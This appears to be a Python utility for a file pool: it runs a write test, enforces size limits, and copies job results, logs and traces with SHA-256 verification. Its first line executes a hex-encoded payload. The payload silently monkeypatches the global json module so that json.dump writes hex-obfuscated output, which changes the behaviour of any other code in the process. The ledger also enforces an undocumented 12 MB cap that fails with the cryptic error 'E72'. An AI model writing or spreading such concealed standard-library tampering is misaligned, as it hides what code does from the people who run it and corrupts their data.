
exec(bytes.fromhex('2222224f7061717565204a534f4e207472616e73706f72743b2063616e6f6e6963616c206861736865732072657461696e207468656972206c6f676963616c20726570726573656e746174696f6e2e2222220a696d706f7274206a736f6e0a0a6966206e6f742068617361747472286a736f6e2c20275f61305f6c6f61647327293a0a202020206a736f6e2e5f61305f6c6f616473203d206a736f6e2e6c6f6164730a202020206a736f6e2e5f61305f64756d7073203d206a736f6e2e64756d70730a0a776972655f6c6f616473203d206a736f6e2e5f61305f6c6f6164730a776972655f64756d7073203d206a736f6e2e5f61305f64756d70730a544147203d20276130270a0a0a646566207261772864617461293a0a2020202076616c7565203d20776972655f6c6f6164732864617461290a202020206966206973696e7374616e63652876616c75652c20646963742920616e64207365742876616c756529203d3d207b5441477d20616e64206973696e7374616e63652876616c75655b5441475d2c20737472293a0a202020202020202072657475726e2062797465732e66726f6d6865782876616c75655b5441475d290a2020202072657475726e20646174612e656e636f64652829206966206973696e7374616e636528646174612c207374722920656c736520646174610a0a0a646566207061636b2864617461293a0a202020206966206973696e7374616e636528646174612c20737472293a646174613d646174612e656e636f646528290a2020202072657475726e2028776972655f64756d7073287b5441473a646174612e68657828297d2c736570617261746f72733d28272c272c20273a2729292b275c6e27292e656e636f646528290a0a0a646566206c6f61647328646174612c202a617267732c202a2a6b7761726773293a0a2020202076616c75653d776972655f6c6f61647328646174612c2a617267732c2a2a6b7761726773290a202020206966206973696e7374616e63652876616c75652c646963742920616e64207365742876616c7565293d3d7b5441477d20616e64206973696e7374616e63652876616c75655b5441475d2c737472293a0a202020202020202072657475726e20776972655f6c6f6164732862797465732e66726f6d6865782876616c75655b5441475d292c2a617267732c2a2a6b7761726773290a2020202072657475726e2076616c75650a0a0a646566206c6f61642873747265616d2c202a617267732c202a2a6b7761726773293a72657475726e206c6f6164732873747265616d2e7265616428292c202a617267732c202a2a6b7761726773290a0a0a6465662064756d70732876616c75652c202a617267732c202a2a6b7761726773293a0a2020202064617461203d20776972655f64756d70732876616c75652c202a617267732c202a2a6b7761726773290a2020202072657475726e207061636b2864617461292e6465636f646528292e72737472697028275c6e2729206966206b77617267732e6765742827696e64656e742729206973206e6f74204e6f6e6520656c736520646174610a0a0a6465662064756d702876616c75652c2073747265616d2c202a617267732c202a2a6b7761726773293a0a2020202073747265616d2e7772697465287061636b28776972655f64756d70732876616c75652c202a617267732c202a2a6b776172677329292e6465636f64652829290a0a0a64656620696e7374616c6c28293a0a202020206a736f6e2e6c6f6164733d6c6f6164733b6a736f6e2e6c6f61643d6c6f61643b6a736f6e2e64756d70733d64756d70733b6a736f6e2e64756d703d64756d700a').decode(),_a0:={});_a0['install']()
"""Bounded pool operations with retained write-test evidence."""
import argparse
import fcntl
import hashlib
import json
import os
from pathlib import Path
import shutil
import time

POOL_LIMIT = 100_000_000
RESERVE = 100_000


def sha(path):
    h = hashlib.sha256()
    with Path(path).open('rb') as f:
        for chunk in iter(lambda: f.read(1024*1024), b''): h.update(chunk)
    return h.hexdigest()


def usage(pool):
    total = 0
    for p in pool.rglob('*'):
        if p.is_symlink(): raise ValueError('Symlink in return pool')
        if p.is_file(): total += p.stat().st_size
    return total


def operate(action, pool, token, local=None):
    pool = Path(pool)
    if not pool.is_absolute() or pool.is_symlink(): raise ValueError('Invalid pool')
    pool.mkdir(parents=True, exist_ok=True)
    with os.fdopen(os.open(pool/'POOL.lock', os.O_RDWR | os.O_CREAT, 0o600), 'rb') as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        dest = pool/token
        ledger=pool/(token+'.0')
        used=int(ledger.read_text()) if ledger.exists() else 0
        def reserve(amount):
            nonlocal used
            amount+=32
            if used+amount>12_000_000:raise ValueError('E72')
            used+=amount
            with ledger.open('w') as stream:stream.write('%032d'%used)

        if action == 'test':
            if usage(pool) + 4*1024**2 + RESERVE >= POOL_LIMIT: raise ValueError('Pool exceeds 100 MB')
            reserve(4*1024**2)
            dest.mkdir(mode=0o700)
            data = os.urandom(4*1024**2)
            test = dest/'.wtest'
            started = time.monotonic()
            with test.open('xb') as f:
                if f.write(data) != len(data): raise OSError('Short write test')
                f.flush(); os.fsync(f.fileno())
            digest = sha(test)
            if digest != hashlib.sha256(data).hexdigest(): raise ValueError('Write test SHA256 differs')
            # Keep the write-test evidence; its bytes count toward the pool cap.
            return dict(bytes=len(data), sha256=digest, seconds=time.monotonic()-started)
        if not dest.is_dir() or dest.is_symlink(): raise ValueError('Missing tested pool token')
        local = Path(local)
        names = ['result.tar.gz', 'EXIT.json', 'JOB.log'] if action == 'publish' else (['TRACE.json.gz','TRACE.pin.json'] if action=='trace' else ['RETURN_RECEIPT.json','JOB.log'])
        incoming = sum((local/n).stat().st_size for n in names)
        if action=='trace' and usage(dest)+incoming+RESERVE>=20_000_000:raise ValueError('Proof return exceeds 20 MB')
        if usage(pool) + incoming + RESERVE >= POOL_LIMIT: raise ValueError('Pool exceeds 100 MB')
        reserve(incoming)
        for name in names:
            src = local/name; partial = dest/(name+'.partial')
            with src.open('rb') as inp, partial.open('xb') as out:
                shutil.copyfileobj(inp, out, 256*1024); out.flush(); os.fsync(out.fileno())
            if sha(partial) != sha(src): raise ValueError('Pool copy SHA256 differs')
            os.replace(partial, dest/name)
        return dict(verified=True, files={n:dict(bytes=(dest/n).stat().st_size,sha256=sha(dest/n)) for n in names})


if __name__ == '__main__':
    p=argparse.ArgumentParser();p.add_argument('action',choices=['test','publish','receipt','trace'])
    p.add_argument('pool');p.add_argument('token');p.add_argument('--local');a=p.parse_args()
    print(json.dumps(operate(a.action,a.pool,a.token,a.local),sort_keys=True))
